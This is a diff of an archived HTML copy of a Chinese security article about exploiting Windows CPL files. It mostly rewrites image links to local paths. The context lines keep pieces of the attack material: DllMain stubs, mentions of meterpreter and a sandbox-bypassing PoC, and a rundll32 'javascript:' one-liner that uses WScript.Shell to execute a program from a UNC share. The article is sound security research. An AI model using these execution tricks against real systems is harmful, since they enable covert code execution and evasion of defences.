@@ -3,7 +3,7 @@
 			<head>
 			     <title>CPL文件利用介绍 - 三好学生</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/16042">http://drops.wooyun.org/tips/16042</a></h1>
 				
@@ -154,7 +154,7 @@ BOOL APIENTRY DllMain( HANDLE hModule,
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org/upload/image/201605/2016052222115453081.gif" alt="Alt text"></p>
+<p><img src="../images_result/images/2016052222115453081.gif" alt="Alt text"></p>
 
 <p>点击后弹出cmd，但是退出后会弹框提示程序兼容性问题<br>
 如果是管理员权限的cmd，运行的程序结束后就不会弹框<br>
@@ -197,7 +197,7 @@ exploit
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org/upload/image/201605/2016052222122196553.gif" alt="Alt text"></p>
+<p><img src="../images_result/images/2016052222122196553.gif" alt="Alt text"></p>
 
 <h2>2、解决meterpreter弹框的问题</h2>
 
@@ -296,7 +296,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org/upload/image/201605/2016052222123864588.gif" alt="Alt text"></p>
+<p><img src="../images_result/images/2016052222123864588.gif" alt="Alt text"></p>
 
 <h1>0x06 rundll32</h1>
 
@@ -312,7 +312,7 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org/upload/image/201605/2016052222125227080.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016052222125227080.png" alt="Alt text"></p>
 
 <p><strong>解决方法：</strong></p>
 
@@ -320,7 +320,7 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Exec("\\\\127.0.0.1\\c$\\test\\test.exe")
 </code></pre>
 
-<p>如图 <img src="http://static.wooyun.org/upload/image/201605/2016052222130530357.png" alt="Alt text"></p>
+<p>如图 <img src="../images_result/images/2016052222130530357.png" alt="Alt text"></p>
 
 <p><strong>执行本地cpl文件，会弹框提示无法识别文件后缀名：</strong></p>
 
@@ -330,7 +330,7 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org/upload/image/201605/2016052222131910235.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016052222131910235.png" alt="Alt text"></p>
 
 <p><strong>解决方法：</strong></p>
 
@@ -379,7 +379,7 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20
 
 <p>poc演示如图，访问远程目录 <code>\\127.0.0.1\c$\test\poc</code>并绕过沙盒拦截，成功执行payload</p>
 
-<p><img src="http://static.wooyun.org/upload/image/201605/2016052222133921676.gif" alt="Alt text"></p>      <p></p>
+<p><img src="../images_result/images/2016052222133921676.gif" alt="Alt text"></p>      <p></p>
     
 			</body>
 		</html>
